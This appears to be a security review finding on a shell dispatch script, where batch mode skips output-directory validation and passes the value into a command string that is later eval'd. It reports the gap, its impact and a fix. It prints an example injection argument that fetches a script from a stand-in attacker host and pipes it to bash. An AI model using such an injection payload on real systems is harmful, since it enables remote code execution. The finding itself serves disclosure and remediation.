---
reviewer_tag: security-codex
round: 11
finding_id: R11-F01
severity: high
change_type: correctness
referenced_files:
  - scripts/dispatch-agent.sh:231-245
  - scripts/dispatch-agent.sh:621-623
  - scripts/dispatch-agent.sh:800
  - scripts/dispatch-agent.sh:447
---

# F01 — Batch mode skips _validate_output_dir allowlist; OUTPUT_DIR → split_cmd → eval ⇒ RCE

`_validate_output_dir` (L231-245) exists specifically to prevent shell metacharacters in OUTPUT_DIR because downstream consumers eval `split_cmd` (per the comment at L231-235). Single mode calls the validator. Batch mode does NOT — it only checks the value starts with `/` (L621-623), then propagates into OUTPUT_DIR (L800). `emit_dispatch_manifest_entry` (L447) embeds OUTPUT_DIR unquoted into `split_cmd`.

ATTACK: an actor who controls batch `--output-dir` (CI/workflow input, env-derived value) supplies:
  `--output-dir '/repo/out; curl https://attacker/p.sh | bash #'`
This passes the starts-with-`/` check, lands in manifest `split_cmd` unquoted, and when orchestration later eval-executes `split_cmd`, the injected command runs with orchestrator privileges.

IMPACT: arbitrary command execution in the review runner/orchestrator context.

FIX: in batch mode, call `_validate_output_dir "$BATCH_OUTPUT_DIR"` (mirror single-mode discipline) before any use. Bonus: stop emitting shell command strings that require downstream eval — emit structured manifest fields instead.
